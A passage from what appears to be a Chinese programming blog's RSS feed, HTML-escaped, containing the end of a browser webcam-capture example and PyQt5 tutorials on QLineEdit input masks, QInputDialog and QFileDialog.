    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;// 开启摄像
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;play&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;onclick&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; () =&amp;gt; {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;constraints&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
                &lt;span style=&#34;color:#75715e&#34;&gt;// video属性设置
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;video&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; {
                    &lt;span style=&#34;color:#a6e22e&#34;&gt;width&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;,
                    &lt;span style=&#34;color:#a6e22e&#34;&gt;height&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;
                },
                &lt;span style=&#34;color:#75715e&#34;&gt;// audio属性设置
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;audio&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
            }
            &lt;span style=&#34;color:#a6e22e&#34;&gt;navigator&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;mediaDevices&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getUserMedia&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;constraints&lt;/span&gt;)
            .&lt;span style=&#34;color:#a6e22e&#34;&gt;then&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;mediaStream&lt;/span&gt; =&amp;gt; {
                &lt;span style=&#34;color:#75715e&#34;&gt;// 成功返回promise对象，接收一个mediaStream参数与video标签进行对接
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;video&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;srcObject&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mediaStream&lt;/span&gt;
                document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;video&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;play&lt;/span&gt;()
            })
            &lt;span style=&#34;color:#75715e&#34;&gt;// 失败就失败了
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        }
        &lt;span style=&#34;color:#75715e&#34;&gt;// 拍照、canvas绘制
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;take&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;onclick&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; () =&amp;gt; {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;canvas&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;getContext&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2d&amp;#39;&lt;/span&gt;)
            &lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;drawImage&lt;/span&gt;(document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;video&amp;#34;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;)
        }
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>PyQt5—QLineEdit 文本元件</title>
        <link>https://ac-lm.github.io/posts/pyqt5/pyqt5qlineedit-%E6%96%87%E6%9C%AC%E5%85%83%E4%BB%B6/</link>
        <pubDate>Tue, 22 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pyqt5/pyqt5qlineedit-%E6%96%87%E6%9C%AC%E5%85%83%E4%BB%B6/</guid>
        <description>&lt;h2 id=&#34;1常用方法&#34;&gt;1.常用方法&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;setText(str)  &lt;span style=&#34;color:#75715e&#34;&gt;# 设置普通文本&lt;/span&gt;
Text()  &lt;span style=&#34;color:#75715e&#34;&gt;# -&amp;gt; str返回普通文本&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2使用掩码限制格式&#34;&gt;2.使用掩码限制格式&lt;/h2&gt;
&lt;h3 id=&#34;掩码使用&#34;&gt;掩码使用&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;ipLineEdit&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setInputMask(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;000.000.000.000;_&amp;#39;&lt;/span&gt;)
macLineEdit&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setInputMask(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HH:HH:HH:HH:HH:HH;_&amp;#39;&lt;/span&gt;)
dateLineEdit&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setInputMask(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0000-00-00&amp;#39;&lt;/span&gt;)
licenseLineEdit&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setInputMask(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt;AAAAA-AAAAA-AAAAA-AAAAA-AAAAA;#&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;掩码类型&#34;&gt;掩码类型&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#---掩码类型------------------------------------------------------------
A    ASCII字母字符是必须输入的(A-Z、a-z)
a    ASCII字母字符是允许输入的,但不是必需的(A-Z、a-z)
N    ASCII字母字符是必须输入的(A-Z、a-z、0-9)
n    ASII字母字符是允许输入的,但不是必需的(A-Z、a-z、0-9)
X    任何字符都是必须输入的
x    任何字符都是允许输入的,但不是必需的
9    ASCII数字字符是必须输入的(0-9)
0    ASCII数字字符是允许输入的,但不是必需的(0-9)
D    ASCII数字字符是必须输入的(1-9)
d    ASCII数字字符是允许输入的,但不是必需的(1-9)
#    ASCI数字字符或加减符号是允许输入的,但不是必需的
H    十六进制格式字符是必须输入的(A-F、a-f、0-9)
h    十六进制格式字符是允许输入的,但不是必需的(A-F、a-f、0-9)
B    二进制格式字符是必须输入的(0,1)
b    二进制格式字符是允许输入的,但不是必需的(0,1)
&amp;gt;    所有的字母字符都大写
&amp;lt;    所有的字母字符都小写
!    关闭大小写转换
\    使用&amp;quot;\&amp;quot;转义上面列出的字符
#---------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>PyQt5—QInputDialog 输入对话框类</title>
        <link>https://ac-lm.github.io/posts/pyqt5/pyqt5qinputdialog-%E8%BE%93%E5%85%A5%E5%AF%B9%E8%AF%9D%E6%A1%86%E7%B1%BB/</link>
        <pubDate>Mon, 21 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pyqt5/pyqt5qinputdialog-%E8%BE%93%E5%85%A5%E5%AF%B9%E8%AF%9D%E6%A1%86%E7%B1%BB/</guid>
        <description>&lt;h2 id=&#34;1简介&#34;&gt;1.简介&lt;/h2&gt;
&lt;p&gt;QInputDialog 继承自 QDialog 提供了一种简单的对话框来获得用户的单个输入信息&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;QInputDialog&lt;/span&gt;(QDialog)
&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; QInputDialog(QWidget parent&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WindowFlags flags&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;常用以下方法获取对话框的信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;字符串型   QInputDialog.getText&lt;/li&gt;
&lt;li&gt;Int类型数据    QInputDialog.getInt&lt;/li&gt;
&lt;li&gt;double类型数据    QInputDialog.getDouble&lt;/li&gt;
&lt;li&gt;下拉列表框的条目   QInputDialog.getItem&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2qinputdialoggettext&#34;&gt;2.QInputDialog.getText&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;QString getText( QWidget &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; parent, &lt;span style=&#34;color:#75715e&#34;&gt;#标准输入对话框的父窗口&lt;/span&gt;

const QString &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; title, &lt;span style=&#34;color:#75715e&#34;&gt;#输入对话框的标题名&lt;/span&gt;

const QString &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; label,&lt;span style=&#34;color:#75715e&#34;&gt;#标准输入对话框的标签提示&lt;/span&gt;

const QString &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; text &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; QString(), &lt;span style=&#34;color:#75715e&#34;&gt;#标准字符串输入对话框弹出时QLineEdit控件中默认出现的文字&lt;/span&gt;

bool &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ok &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;#用于指示标准输入对话框的哪个按钮被触发，若ok为true，则表示用户单击了OK（确定）按钮，若ok为false，则表示用户单击了Cancel（取消）按钮&lt;/span&gt;

Qt::WindowFlags flags &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;#知名标准输入对话框的窗体标识&lt;/span&gt;

Qt::InputMethodHints inputMethodHints &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Qt::ImhNone ); [static]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3qinputdialoggetitem&#34;&gt;3.QInputDialog.getItem&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;QString getItem( QWidget &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; parent, &lt;span style=&#34;color:#75715e&#34;&gt;#标准输入对话框的父窗口&lt;/span&gt;

const QString &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; title, &lt;span style=&#34;color:#75715e&#34;&gt;#标准输入对话框的标题名&lt;/span&gt;

const QString &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; label, &lt;span style=&#34;color:#75715e&#34;&gt;#标准输入对话框的标签提示&lt;/span&gt;

const QStringList &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; list, &lt;span style=&#34;color:#75715e&#34;&gt;#指定标准输入对话框中QComboBox控件显示的可选条目，为一个QStringList对象&lt;/span&gt;

int current &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;#指定标准输入对话框中QComboBox控件显示的可选条目，为一个QStringList对象&lt;/span&gt;

bool editable &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; true, &lt;span style=&#34;color:#75715e&#34;&gt;#指定QComboBox控件中显示的文字是否可编辑；&lt;/span&gt;

bool &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ok &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;#用于指定标准输入对话框的哪个那妞被触发，若ok为false，则表示用户单击了Cancel（取消）按钮；&lt;/span&gt;

Qt::WindowFlags f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ) ; [static]  &lt;span style=&#34;color:#75715e&#34;&gt;#用于指定标准输入对话框的哪个那妞被触发，若ok为false，则表示用户单击了Cancel（取消）按钮；&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4qinputdialoggetint&#34;&gt;4.QInputDialog.getInt&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;
int getInteger( QWidget &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; parent, &lt;span style=&#34;color:#75715e&#34;&gt;#父窗口&lt;/span&gt;

const QString &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; title,  &lt;span style=&#34;color:#75715e&#34;&gt;#标题名&lt;/span&gt;

const QString &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; label, &lt;span style=&#34;color:#75715e&#34;&gt;#标签提示&lt;/span&gt;

int value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,  &lt;span style=&#34;color:#75715e&#34;&gt;#指定标准输入对话框中QSpinBox控件默认显示值&lt;/span&gt;

int minValue &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2147483647&lt;/span&gt;,

int maxValue &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2147483647&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;#指定QSpinBoxBox控件的数值范围，最小和最大值&lt;/span&gt;

int step &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;#step指定QSpinBox控件的步进值（即步长）&lt;/span&gt;

bool &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ok &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,

Qt::WindowFlags f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ) ;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5qinputdialoggetdouble&#34;&gt;5.QInputDialog.getDouble&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;double getDouble( QWidget &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; parent,

const QString &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; title,

const QString &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; label, &lt;span style=&#34;color:#75715e&#34;&gt;#标签提示&lt;/span&gt;

double value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,  &lt;span style=&#34;color:#75715e&#34;&gt;#指定标准输入对话框中QSpinBox控件默认显示值&lt;/span&gt;

double minValue &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2147483647&lt;/span&gt;,

double maxValue &lt;span style=&#34;color:#ae81ff&#34;&gt;2147483647&lt;/span&gt;,

int decimals &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,  &lt;span style=&#34;color:#75715e&#34;&gt;#指定QSpinBox控件的浮动数的小数点位数&lt;/span&gt;

bool &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ok &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,

Qt::WindowFlags f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ) ;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6简单使用&#34;&gt;6.简单使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getInteger&lt;/span&gt;(self):
    i, okPressed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; QInputDialog&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getInt(self, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Get integer&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Percentage:&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; okPressed:
        print(i)
 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getDouble&lt;/span&gt;(self):
    d, okPressed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; QInputDialog&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getDouble(self, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Get double&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Value:&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10.50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; okPressed:
        print( d)
 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getChoice&lt;/span&gt;(self):
    items &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Red&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Blue&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Green&amp;#34;&lt;/span&gt;)
    item, okPressed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; QInputDialog&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getItem(self, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Get item&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Color:&amp;#34;&lt;/span&gt;, items, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ok &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; item:
        print(item)
 
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getText&lt;/span&gt;(self):
    text, okPressed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; QInputDialog&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getText(self, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Get text&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Your name:&amp;#34;&lt;/span&gt;, QLineEdit&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Normal, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; okPressed &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; text &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;:
        print(text)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>PyQt5—QFileDialog 文件类</title>
        <link>https://ac-lm.github.io/posts/pyqt5/pyqt5qfiledialog-%E6%96%87%E4%BB%B6%E7%B1%BB/</link>
        <pubDate>Sun, 20 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pyqt5/pyqt5qfiledialog-%E6%96%87%E4%BB%B6%E7%B1%BB/</guid>
        <description>&lt;h2 id=&#34;1调用文件对话框获取文件信息&#34;&gt;1.调用文件对话框获取文件信息&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 主要接口&lt;/span&gt;
QFileDialog&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getExistingDirectory()   &lt;span style=&#34;color:#75715e&#34;&gt;# 返回选中的文件夹路径&lt;/span&gt;
QFileDialog&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getOpenFileName()   &lt;span style=&#34;color:#75715e&#34;&gt;# 返回选中的文件路径&lt;/span&gt;
QFileDialog&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getOpenFileNames()   &lt;span style=&#34;color:#75715e&#34;&gt;# 返回选中的多个文件路径&lt;/span&gt;
QFileDialog&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getSaveFileName()   &lt;span style=&#34;color:#75715e&#34;&gt;# 存储文件&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2返回选中的文件夹路径&#34;&gt;2.返回选中的文件夹路径&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;QFileDialog&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getExistingDirectory(&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;请选择文件夹路径&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;D:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Qt_ui&amp;#34;&lt;/span&gt;)
QFileDialog&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getExistingDirectory(self, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;请选择文件夹路径&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;D:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Qt_ui&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;#---------------------------------------------------&lt;/span&gt;
第一个参数,有self的话用self,没有的话用None
第二个参数,设置窗口名
第三个参数,设置默认打开路径
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3获取单个文件的路径&#34;&gt;3.获取单个文件的路径&lt;/h2&gt;
